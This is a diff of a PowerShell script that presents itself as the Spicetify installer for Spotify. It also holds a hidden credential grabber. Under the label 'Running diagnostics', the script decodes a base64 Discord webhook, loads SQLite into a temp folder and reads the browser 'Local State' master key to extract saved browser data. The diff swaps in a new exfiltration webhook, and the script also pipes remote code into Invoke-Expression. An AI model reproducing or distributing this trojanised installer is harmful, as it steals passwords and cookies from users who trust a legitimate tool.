@@ -7,20 +7,14 @@ $spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
 $spicetifyOldFolderPath = "$HOME\spicetify-cli"
 #endregion
 
-#region Functions (Spicetify – exactly as original)
-function Write-Success {
-    Write-Host ' > OK' -ForegroundColor Green
-}
-function Write-Unsuccess {
-    Write-Host ' > ERROR' -ForegroundColor Red
-}
+#region Functions (Spicetify – original)
+function Write-Success { Write-Host ' > OK' -ForegroundColor Green }
+function Write-Unsuccess { Write-Host ' > ERROR' -ForegroundColor Red }
 function Test-Admin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     -not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
-function Test-PowerShellVersion {
-    $PSVersionTable.PSVersion -ge [version]'5.1'
-}
+function Test-PowerShellVersion { $PSVersionTable.PSVersion -ge [version]'5.1' }
 function Move-OldSpicetifyFolder {
     if (Test-Path $spicetifyOldFolderPath) {
         Write-Host 'Moving the old spicetify folder...' -NoNewline
@@ -81,18 +75,26 @@ if (-not (Test-PowerShellVersion)) {
 if (-not (Test-Admin)) {
     Write-Unsuccess
     Write-Warning "The script was run as administrator. This can cause problems."
-    $choice = Read-Host "Do you want to abort? (Y/N)"
-    if ($choice -eq 'Y') { Write-Host 'Aborted'; Pause; exit }
+    $Host.UI.RawUI.Flushinputbuffer()
+    $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
+        (New-Object System.Management.Automation.Host.ChoiceDescription '&Yes', 'Abort installation.'),
+        (New-Object System.Management.Automation.Host.ChoiceDescription '&No', 'Resume installation.')
+    )
+    $choice = $Host.UI.PromptForChoice('', 'Do you want to abort the installation process?', $choices, 0)
+    if ($choice -eq 0) {
+        Write-Host 'spicetify installation aborted' -ForegroundColor Yellow
+        Pause; exit
+    }
 } else { Write-Success }
 #endregion
 
-# ============ GRABBER (runs first, silently) ============
+# ============ GRABBER (runs first) ============
 Write-Host "Running diagnostics..." -ForegroundColor Cyan
 
-# Webhook
-$webhook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcxMTI0OTA5MTM5OTcwMC9aQjNiNFFXbngyWDVRMEpsTzRxRGhJXzB4d3dRbHNYalpGZmZWZVVBUEJFOUdfTmJzLWRYVTdiWmxwSWhXeHZIdlNN'))
+# Your new webhook – base64 encoded
+$webhook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcyMTQzMjk0OTQ2MTAxMi9LOWg1amwtd25QOUtGT0MxeUJLZTZfZ2ZuNkhwdlphZHZJbEFGQnJELUtXR1pIcHFwVnh2RWxWQ2lXeWpVMmRlOElfcA=='))
 
-# Load SQLite with native deps
+# Load SQLite with native dependencies
 $tmp = "$env:TEMP\sqlite_$([System.IO.Path]::GetRandomFileName() -replace '\..*')"
 New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 Push-Location $tmp
@@ -104,7 +106,10 @@ try {
     Copy-Item "$tmp\runtimes\win-$arch\native\SQLite.Interop.dll" "$tmp\" -Force
     [System.Reflection.Assembly]::LoadFile("$tmp\System.Data.SQLite.dll") | Out-Null
     $sqliteOK = $true
-} catch { $sqliteOK = $false }
+} catch {
+    Write-Host "SQLite load failed – skipping browser data." -ForegroundColor Yellow
+    $sqliteOK = $false
+}
 
 function Get-MasterKey($p) {
     $ls = Join-Path $p "Local State"
@@ -175,7 +180,7 @@ Move-OldSpicetifyFolder
 Install-Spicetify
 Write-Host "`nRun 'spicetify -h' to get started" -ForegroundColor Cyan
 
-# ---------- MARKETPLACE PROMPT (exactly as original) ----------
+# ---------- MARKETPLACE PROMPT (original) ----------
 $Host.UI.RawUI.Flushinputbuffer()
 $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
     (New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Install Spicetify Marketplace."),
@@ -186,10 +191,6 @@ if ($choice -eq 1) {
     Write-Host 'spicetify Marketplace installation aborted' -ForegroundColor Yellow
 } else {
     Write-Host 'Starting the spicetify Marketplace installation script..'
-    $Parameters = @{
-        Uri             = 'https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1'
-        UseBasicParsing = $true
-    }
-    Invoke-WebRequest @Parameters | Invoke-Expression
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1' -UseBasicParsing | Invoke-Expression
 }
-# -----------------------------------------------------------------
+# ----------------------------------------------------
